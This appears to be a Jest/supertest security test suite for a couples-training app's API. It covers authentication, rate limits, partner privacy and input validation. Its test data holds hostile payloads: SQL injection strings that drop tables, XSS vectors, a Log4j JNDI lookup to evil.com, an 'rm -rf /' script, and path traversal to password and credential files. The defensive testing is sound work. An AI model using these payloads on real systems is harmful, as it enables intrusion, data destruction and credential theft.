const request = require('supertest');
const { createApp } = require('../../backend/src/app');
const { testHelpers } = global;

/**
 * Security Validation Tests
 * 
 * Tests security requirements from PRD Section 8.3:
 * - JWT authentication with proper expiration
 * - SQL injection prevention
 * - XSS protection
 * - Rate limiting enforcement
 * - Data encryption and privacy
 * - Abuse prevention patterns
 */
describe('Security Validation Tests', () => {
  let app;
  
  beforeAll(async () => {
    app = await createApp();
  });
  
  beforeEach(async () => {
    await testHelpers.cleanDatabase();
  });
  
  describe('Authentication Security', () => {
    it('should prevent SQL injection in login attempts', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; UPDATE users SET password='hacked'; --",
        "' UNION SELECT * FROM users; --",
        "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --"
      ];
      
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/auth/login')
          .send({
            email: payload,
            password: payload
          });
        
        // Should not cause server error, just invalid credentials
        expect(response.status).toBe(401);
        expect(response.body.error).toContain('Invalid credentials');
      }
      
      // Verify database integrity by attempting valid registration
      const testUser = await testHelpers.createTestUser();
      const registerResponse = await request(app)
        .post('/api/v1/auth/register')
        .send(testUser);
      
      expect(registerResponse.status).toBe(201);
    });
    
    it('should sanitize XSS attempts in user registration', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '"onmouseover="alert(\'XSS\')"',
        '<svg onload=alert("XSS")>'
      ];
      
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            email: 'test@example.com',
            password: 'SecurePass123!',
            name: payload
          });
        
        if (response.status === 201) {
          // If registration succeeds, name should be sanitized
          expect(response.body.name || '').not.toContain('<script>');
          expect(response.body.name || '').not.toContain('javascript:');
          expect(response.body.name || '').not.toContain('onerror');
        } else {
          // Should reject malicious input
          expect(response.status).toBe(400);
        }
      }
    });
    
    it('should enforce JWT token expiration', async () => {
      const testUser = await testHelpers.createTestUser();
      
      // Register user
      await request(app)
        .post('/api/v1/auth/register')
        .send(testUser);
      
      // Login to get token
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: testUser.password
        });
      
      const token = loginResponse.body.token;
      
      // Create an expired token
      const jwt = require('jsonwebtoken');
      const expiredToken = jwt.sign(
        { userId: loginResponse.body.user_id },
        process.env.JWT_SECRET,
        { expiresIn: '-1h' } // Expired 1 hour ago
      );
      
      // Try to use expired token
      const response = await request(app)
        .get('/api/v1/training/current')
        .set('Authorization', `Bearer ${expiredToken}`);
      
      expect(response.status).toBe(401);
      expect(response.body.error).toContain('expired');
    });
    
    it('should prevent token manipulation', async () => {
      const testUser = await testHelpers.createTestUser();
      
      await request(app)
        .post('/api/v1/auth/register')
        .send(testUser);
      
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: testUser.password
        });
      
      const validToken = loginResponse.body.token;
      
      // Test various token manipulation attempts
      const manipulatedTokens = [
        validToken.slice(0, -10) + 'manipulated',
        validToken + 'extra',
        validToken.replace(/./g, 'x'),
        'Bearer ' + validToken, // Double Bearer
        validToken.split('.').reverse().join('.') // Reverse parts
      ];
      
      for (const token of manipulatedTokens) {
        const response = await request(app)
          .get('/api/v1/training/current')
          .set('Authorization', `Bearer ${token}`);
        
        expect(response.status).toBe(401);
      }
    });
    
    it('should enforce password security requirements', async () => {
      const weakPasswords = [
        '123',
        'password',
        '12345678',
        'qwerty',
        'abc123',
        '11111111',
        'password123'
      ];
      
      for (const password of weakPasswords) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            email: 'test@example.com',
            password: password,
            name: 'Test User'
          });
        
        expect(response.status).toBe(400);
        expect(response.body.error).toMatch(/password/i);
      }
    });
  });
  
  describe('Rate Limiting Security', () => {
    it('should enforce authentication rate limits', async () => {
      const testUser = await testHelpers.createTestUser();
      
      // Register user first
      await request(app)
        .post('/api/v1/auth/register')
        .send(testUser);
      
      // Attempt to exceed login rate limit (5 attempts per 15 min)
      const promises = Array(6).fill().map(() => 
        request(app)
          .post('/api/v1/auth/login')
          .send({
            email: testUser.email,
            password: 'wrong-password'
          })
      );
      
      const responses = await Promise.all(promises);
      
      // Last request should be rate limited
      const lastResponse = responses[5];
      expect(lastResponse.status).toBe(429);
      expect(lastResponse.body.error).toContain('rate limit');
    });
    
    it('should enforce translator rate limits', async () => {
      const testUser = await testHelpers.createTestUser();
      
      await request(app)
        .post('/api/v1/auth/register')
        .send(testUser);
      
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: testUser.password
        });
      
      const token = loginResponse.body.token;
      
      // Attempt to exceed translator rate limit (20 per hour)
      const promises = Array(21).fill().map((_, i) => 
        request(app)
          .post('/api/v1/translator/tes')
          .set('Authorization', `Bearer ${token}`)
          .send({ input_text: `Rate limit test ${i}` })
      );
      
      const responses = await Promise.all(promises);
      
      // Last request should be rate limited
      const lastResponse = responses[20];
      expect(lastResponse.status).toBe(429);
    });
    
    it('should enforce mediator rate limits', async () => {
      const testUser = await testHelpers.createTestUser();
      
      await request(app)
        .post('/api/v1/auth/register')
        .send(testUser);
      
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: testUser.password
        });
      
      const token = loginResponse.body.token;
      const audioBuffer = createMockAudioBuffer(30);
      
      // Attempt to exceed mediator rate limit (10 per hour)
      const promises = Array(11).fill().map(() => 
        request(app)
          .post('/api/v1/mediator/upload?speaker=partner1&duration_seconds=30')
          .set('Authorization', `Bearer ${token}`)
          .set('Content-Type', 'audio/m4a')
          .send(audioBuffer)
      );
      
      const responses = await Promise.all(promises);
      
      // Last request should be rate limited
      const lastResponse = responses[10];
      expect(lastResponse.status).toBe(429);
    });
  });
  
  describe('Data Privacy and Protection', () => {
    let authTokens, couple;
    
    beforeEach(async () => {
      // Setup paired users for privacy tests
      couple = await testHelpers.createTestCouple();
      authTokens = {};
      
      for (const [key, user] of Object.entries(couple)) {
        await request(app)
          .post('/api/v1/auth/register')
          .send(user);
        
        const loginResponse = await request(app)
          .post('/api/v1/auth/login')
          .send({
            email: user.email,
            password: user.password
          });
        
        authTokens[key] = loginResponse.body.token;
      }
      
      // Pair the users
      const codeResponse = await request(app)
        .post('/api/v1/pairing/generate-code')
        .set('Authorization', `Bearer ${authTokens.user1}`);
      
      await request(app)
        .post('/api/v1/pairing/join')
        .set('Authorization', `Bearer ${authTokens.user2}`)
        .send({ pairing_code: codeResponse.body.pairing_code });
    });
    
    it('should prevent partners from accessing each others private data', async () => {
      // User 1 creates a private journal entry
      const journalResponse = await request(app)
        .post('/api/v1/journal')
        .set('Authorization', `Bearer ${authTokens.user1}`)
        .send({
          level: 1,
          section: 1,
          prompt: 'Private thoughts',
          content: 'This is my private journal entry',
          shared_with_partner: false
        });
      
      const entryId = journalResponse.body.entry_id;
      
      // User 2 tries to access User 1's private journal entry
      const accessAttempt = await request(app)
        .get(`/api/v1/journal/${entryId}`)
        .set('Authorization', `Bearer ${authTokens.user2}`);
      
      expect(accessAttempt.status).toBe(403);
    });
    
    it('should prevent access to other users translator sessions', async () => {
      // User 1 creates a translator session
      const translatorResponse = await request(app)
        .post('/api/v1/translator/tes')
        .set('Authorization', `Bearer ${authTokens.user1}`)
        .send({ input_text: 'Private translation' });
      
      const sessionId = translatorResponse.body.session_id;
      
      // User 2 tries to access User 1's translator session
      const accessAttempt = await request(app)
        .get(`/api/v1/translator/${sessionId}`)
        .set('Authorization', `Bearer ${authTokens.user2}`);
      
      expect(accessAttempt.status).toBe(403);
    });
    
    it('should prevent access to other users mediator sessions', async () => {
      const audioBuffer = createMockAudioBuffer(30);
      
      // User 1 uploads audio
      const uploadResponse = await request(app)
        .post('/api/v1/mediator/upload?speaker=partner1&duration_seconds=30')
        .set('Authorization', `Bearer ${authTokens.user1}`)
        .set('Content-Type', 'audio/m4a')
        .send(audioBuffer);
      
      const sessionId = uploadResponse.body.session_id;
      
      // User 2 tries to access User 1's mediator session
      const accessAttempt = await request(app)
        .get(`/api/v1/mediator/${sessionId}`)
        .set('Authorization', `Bearer ${authTokens.user2}`);
      
      expect(accessAttempt.status).toBe(403);
    });
    
    it('should hide sensitive progress details from partners', async () => {
      // User 1 checks their progress
      const progressResponse = await request(app)
        .get('/api/v1/training/current')
        .set('Authorization', `Bearer ${authTokens.user1}`);
      
      expect(progressResponse.status).toBe(200);
      
      // Partner progress should only show basic completion status
      const partnerProgress = progressResponse.body.partner_progress;
      
      // Should have basic completion info
      expect(partnerProgress).toHaveProperty('content_complete');
      
      // Should NOT have detailed scores or attempt counts
      expect(partnerProgress).not.toHaveProperty('comprehension_score');
      expect(partnerProgress).not.toHaveProperty('comprehension_attempts');
    });
  });
  
  describe('Input Validation and Sanitization', () => {
    let authToken, testUser;
    
    beforeEach(async () => {
      testUser = await testHelpers.createTestUser();
      
      await request(app)
        .post('/api/v1/auth/register')
        .send(testUser);
      
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: testUser.password
        });
      
      authToken = loginResponse.body.token;
    });
    
    it('should validate and sanitize translator inputs', async () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '${jndi:ldap://evil.com/a}', // Log4j injection
        '{{7*7}}', // Template injection
        '\x00\x01\x02', // Null bytes
        'SELECT * FROM users', // SQL-like injection
        'javascript:alert(1)'
      ];
      
      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/v1/translator/tes')
          .set('Authorization', `Bearer ${authToken}`)
          .send({ input_text: input });
        
        if (response.status === 200) {
          // If processed, output should be sanitized
          const translation = response.body.translation;
          expect(translation.outer).not.toContain('<script>');
          expect(translation.outer).not.toContain('javascript:');
          expect(translation.outer).not.toContain('jndi:');
        } else {
          // Should reject dangerous input
          expect(response.status).toBe(400);
        }
      }
    });
    
    it('should validate file uploads for mediator', async () => {
      const maliciousFiles = [
        Buffer.from('<script>alert("XSS")</script>'), // HTML content
        Buffer.from('#!/bin/bash\nrm -rf /'), // Script content
        Buffer.from('\x4D\x5A'), // PE header (executable)
        Buffer.from('\x7F\x45\x4C\x46') // ELF header (executable)
      ];
      
      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/v1/mediator/upload?speaker=partner1&duration_seconds=30')
          .set('Authorization', `Bearer ${authToken}`)
          .set('Content-Type', 'audio/m4a')
          .send(file);
        
        // Should reject non-audio content
        expect(response.status).toBe(400);
        expect(response.body.error).toContain('invalid audio');
      }
    });
    
    it('should prevent path traversal attacks', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '../../../../proc/self/environ',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '....//....//....//etc/passwd'
      ];
      
      for (const path of pathTraversalAttempts) {
        // Try path traversal in various endpoints
        const responses = await Promise.all([
          request(app)
            .get(`/api/v1/training/sections/1/1?file=${path}`)
            .set('Authorization', `Bearer ${authToken}`),
          request(app)
            .get(`/api/v1/journal?path=${path}`)
            .set('Authorization', `Bearer ${authToken}`)
        ]);
        
        responses.forEach(response => {
          expect(response.status).not.toBe(200);
          expect(response.body).not.toContain('root:');
          expect(response.body).not.toContain('Administrator:');
        });
      }
    });
  });
  
  describe('Abuse Prevention', () => {
    let authTokens, couple;
    
    beforeEach(async () => {
      couple = await testHelpers.createTestCouple();
      authTokens = {};
      
      for (const [key, user] of Object.entries(couple)) {
        await request(app)
          .post('/api/v1/auth/register')
          .send(user);
        
        const loginResponse = await request(app)
          .post('/api/v1/auth/login')
          .send({
            email: user.email,
            password: user.password
          });
        
        authTokens[key] = loginResponse.body.token;
      }
    });
    
    it('should detect excessive partner monitoring patterns', async () => {
      // Simulate excessive status checking
      for (let i = 0; i < 10; i++) {
        await request(app)
          .get('/api/v1/training/current')
          .set('Authorization', `Bearer ${authTokens.user1}`);
      }
      
      // This would trigger monitoring alerts in a real system
      // For testing, we verify the system can handle the load
      const response = await request(app)
        .get('/api/v1/training/current')
        .set('Authorization', `Bearer ${authTokens.user1}`);
      
      expect(response.status).toBe(200);
    });
    
    it('should detect suspicious completion patterns', async () => {
      // Simulate rushing through content (completing sections too fast)
      const rapidCompletions = [];
      
      for (let section = 1; section <= 5; section++) {
        rapidCompletions.push(
          request(app)
            .post(`/api/v1/training/sections/1/${section}/complete`)
            .set('Authorization', `Bearer ${authTokens.user1}`)
        );
      }
      
      const responses = await Promise.all(rapidCompletions);
      
      // System should handle rapid completions gracefully
      // Real implementation might flag this for review
      responses.forEach(response => {
        expect([200, 400, 429]).toContain(response.status);
      });
    });
    
    it('should prevent automated bot attacks', async () => {
      // Simulate bot-like behavior patterns
      const botPatterns = [
        // Same request repeated exactly
        Array(20).fill().map(() => 
          request(app)
            .post('/api/v1/translator/tes')
            .set('Authorization', `Bearer ${authTokens.user1}`)
            .send({ input_text: 'Exact same message' })
        ),
        // Requests with identical timing
        Array(10).fill().map(() => 
          request(app)
            .get('/api/v1/training/current')
            .set('Authorization', `Bearer ${authTokens.user1}`)
        )
      ];
      
      for (const pattern of botPatterns) {
        const responses = await Promise.all(pattern);
        
        // Should handle bot patterns with rate limiting or detection
        const rateLimitedCount = responses.filter(r => r.status === 429).length;
        expect(rateLimitedCount).toBeGreaterThan(0);
      }
    });
  });
  
  describe('Data Integrity', () => {
    it('should prevent data corruption through malformed requests', async () => {
      const testUser = await testHelpers.createTestUser();
      
      await request(app)
        .post('/api/v1/auth/register')
        .send(testUser);
      
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: testUser.password
        });
      
      const token = loginResponse.body.token;
      
      // Send malformed JSON
      const malformedRequests = [
        request(app)
          .post('/api/v1/translator/tes')
          .set('Authorization', `Bearer ${token}`)
          .set('Content-Type', 'application/json')
          .send('{invalid json}'),
        request(app)
          .post('/api/v1/journal')
          .set('Authorization', `Bearer ${token}`)
          .send({ invalid: 'structure', level: 'not_a_number' })
      ];
      
      const responses = await Promise.all(malformedRequests);
      
      responses.forEach(response => {
        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('error');
      });
      
      // Verify system is still functional after malformed requests
      const healthCheck = await request(app)
        .get('/api/v1/training/current')
        .set('Authorization', `Bearer ${token}`);
      
      expect(healthCheck.status).toBe(200);
    });
  });
  
  // Helper functions
  
  function createMockAudioBuffer(durationSeconds) {
    // Create a simple WAV header + data for testing
    const sampleRate = 44100;
    const samples = sampleRate * durationSeconds;
    const buffer = Buffer.alloc(44 + samples * 2);
    
    // Write WAV header
    buffer.write('RIFF', 0);
    buffer.writeUInt32LE(36 + samples * 2, 4);
    buffer.write('WAVE', 8);
    buffer.write('fmt ', 12);
    buffer.writeUInt32LE(16, 16);
    buffer.writeUInt16LE(1, 20);
    buffer.writeUInt16LE(1, 22);
    buffer.writeUInt32LE(sampleRate, 24);
    buffer.writeUInt32LE(sampleRate * 2, 28);
    buffer.writeUInt16LE(2, 32);
    buffer.writeUInt16LE(16, 34);
    buffer.write('data', 36);
    buffer.writeUInt32LE(samples * 2, 40);
    
    return buffer;
  }
});
